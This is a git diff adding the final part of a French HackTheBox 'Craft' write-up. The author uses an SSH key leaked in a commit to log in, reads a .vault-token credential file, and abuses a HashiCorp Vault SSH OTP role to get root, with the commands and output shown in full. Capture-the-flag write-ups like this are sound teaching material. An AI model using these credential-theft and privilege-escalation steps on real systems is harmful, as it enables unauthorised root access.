@@ -293,4 +293,111 @@ beaucoup trop simple ;)
 
 Mmmh qui est ce gilfuoyle ? Après un peu de recherche je test les mot de passe sur gogs et recupère ses commits:
 ![image](crafthtb8.png)
-oh mais il n'a aucune idée de la sécurité: il a commit sa clé ssh ! On la récu
+oh mais il n'a aucune idée de la sécurité: il a commit sa clé ssh ! On la récupère donc et ont se connect en ssh comme ceci:
+```ssh -i gilfoyle.key gilfoyle@craft.htb```
+Et la le user ez ;) 
+
+user: bbf4b***************
+
+La on fait un ptit ls -la et on remarque le .vault-token :)
+```
+gilfoyle@craft:~$ ls -la
+total 44
+drwx------ 5 gilfoyle gilfoyle 4096 Jan  3 13:42 .
+drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
+-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
+drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
+drwx------ 2 gilfoyle gilfoyle 4096 Jan  3 13:31 .gnupg
+-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
+drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
+-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
+-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
+-rw------- 1 gilfoyle gilfoyle 5091 Jan  3 13:28 .viminfo
+gilfoyle@craft:~$ cat .vault-token 
+f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$
+```
+Je me suis un peu documenté sur vault : http://vaultproject.io/
+Après un peu de recherche on trouve craft-infra/vault/vault.Sh
+
+```bash 
+#!/bin/bash
+
+# set up vault secrets backend
+
+vault secrets enable ssh
+
+vault write ssh/roles/root_otp \
+    key_type=otp \
+    default_user=root \
+    cidr_list=0.0.0.0/0
+```
+vault secrets enable ssh, que veux dire cela ? en cehrchant je tombe sur https://www.vaultproject.io/docs/secrets/ssh/index.html
+Hahaha ! C'est un jeu d'enfant !
+On se connecte avec notre token:
+```
+gilfoyle@craft:~$ vault login
+Token (will be hidden): 
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
+token_duration       ∞
+token_renewable      false
+token_policies       ["root"]
+identity_policies    []
+policies             ["root"]
+gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
+Key                Value
+---                -----
+lease_id           ssh/creds/root_otp/f17d03b6-552a-a90a-02b8-0932aaa20198
+lease_duration     768h
+lease_renewable    false
+ip                 127.0.0.1
+key                c495f06b-daac-8a95-b7aa-c55618b037ee
+key_type           otp
+port               22
+username           root
+gilfoyle@craft:~$
+```
+On peux maintenant utiliser ca: ```c495f06b-daac-8a95-b7aa-c55618b037ee``` et own la machine :
+```
+gilfoyle@craft:~$ ssh root@127.0.0.1
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 27 04:53:14 2019
+root@craft:~# 
+```
+
+Et voila ! 
+N'hésitez pas a me follow sur twitter: @QuasarPwn à me mettre un ptit respect sur HackTheBox et a rejoindre mon discord ! 
+Sur ce 
+Je vous laisse ! 
